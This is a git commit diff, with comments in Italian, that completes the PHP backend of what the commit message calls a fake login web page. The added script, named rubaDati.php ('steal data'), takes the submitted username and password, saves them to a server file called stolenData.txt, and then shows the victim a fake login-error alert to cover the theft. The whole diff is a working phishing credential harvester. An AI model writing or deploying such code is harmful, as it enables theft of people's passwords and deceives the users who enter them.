0bf9169a6be71f2139783d8109915cebcd1953db
Cataldo Ferrante <ferrantealdo194@gmail.com>
2021-09-08 16:06:07 +0200

    Minor fixes on fake login web page, PHP script complete.

--- src/website/php/rubaDati.php
+++ src/website/php/rubaDati.php
@@ -1,3 +1,24 @@
 <?php
-    print(php_info());
+    // Prendo i dati in post -> Salvataggio in un file di testo
+    $username = $_POST['uname'];
+    $psw = $_POST['psw']; // Dati presi dal post 
+
+    // Apertura file di testo e salvatggio sul server del file 
+    $myFile = fopen("../stolenData.txt","w+") or die("Impossibile aprire il file!");
+    $text = $username." ".$psw; 
+
+    // Scrittura file 
+    fwrite($myFile, $text); 
+
+    // Chiusura file 
+    fclose($myFile); 
+
+    // Errore fake 
+    ?>
+    <script> 
+        alert("Stiamo riscontrando dei problemi con l'accesso. Riprova più tardi..")
+    </script> 
+    <?php
+
+
 ?>
